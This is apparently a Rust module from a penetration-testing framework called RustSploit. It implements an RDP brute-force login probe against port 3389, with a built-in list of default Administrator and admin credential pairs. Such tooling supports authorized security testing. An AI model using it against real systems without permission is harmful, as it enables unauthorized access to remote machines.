//! RDP credential probe — wraps `crate::native::rdp::try_login`.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::native::rdp::{self, RdpLoginResult, PROTO_HYBRID, PROTO_RDP, PROTO_SSL};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 3389;

const DEFAULTS: &[(&str, &str)] = &[
    ("Administrator", "Administrator"),
    ("Administrator", "Password1"),
    ("Administrator", ""),
    ("admin", "admin"),
    ("admin", "password"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "RDP Bruteforce".to_string(),
        description:
            "Tests RDP authentication via the X.224 → MCS → CredSSP / Standard RDP flows. \
             Negotiates Hybrid (NLA) → TLS → Standard. Single-target — scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(3389),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("rdp_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "rdp",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/rdp_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    let addr = format!("{}:{}", host, port);
    // Negotiate protocols best-to-worst: NLA → TLS → Standard. The native
    // helper picks whichever the server selects.
    let proto = PROTO_HYBRID | PROTO_SSL | PROTO_RDP;
    match rdp::try_login(&addr, user, pass, timeout, proto).await {
        Ok(RdpLoginResult::Success) => LoginResult::Success,
        Ok(RdpLoginResult::AuthFailed) => LoginResult::AuthFailed,
        Ok(RdpLoginResult::ConnectionFailed(msg)) => LoginResult::Error {
            message: msg,
            retryable: true,
        },
        Ok(RdpLoginResult::ProtocolError(msg)) => LoginResult::Error {
            message: msg,
            retryable: false,
        },
        Err(e) => LoginResult::Error {
            message: format!("rdp: {e:#}"),
            retryable: true,
        },
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/rdp_bruteforce", native);
